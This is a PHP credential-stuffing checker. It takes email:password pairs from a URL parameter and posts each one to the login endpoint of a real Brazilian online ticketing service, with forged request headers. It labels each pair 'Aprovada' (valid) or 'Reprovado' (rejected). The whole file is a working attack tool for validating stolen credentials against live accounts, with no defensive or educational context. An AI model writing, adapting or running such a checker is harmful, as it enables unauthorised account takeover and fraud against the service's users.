<?php

error_reporting(0);
function getStr($string, $start, $end) {
 $str = explode($start, $string);
 $str = explode($end, $str[1]);  
 return $str[0];
}

function multiexplode($string) {
 $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
 $one = str_replace($delimiters, $delimiters[0], $string);
 $two = explode($delimiters[0], $one);
 return $two;
}

$lista = $_GET['lista'];
$email = multiexplode($lista)[0];
$senha = multiexplode($lista)[1];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://sis.bilheteriavirtual.com.br/usuario/validalogin.asp?tploja=s');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "email=$email&senha=$senha&frm=ok&eve_cod=&lista_lote=&lista_qtde=&lista_assentos=&map_id=&tot_ing=");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array(
	'Host: sis.bilheteriavirtual.com.br',
	'Origin: https://sis.bilheteriavirtual.com.br',
	'Referer: https://sis.bilheteriavirtual.com.br/usuario/'
);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);


if (strpos($result, 'Login e/ou senha')) {
	echo "#Reprovado $lista";
}else{
	echo "#Aprovada $lista";
}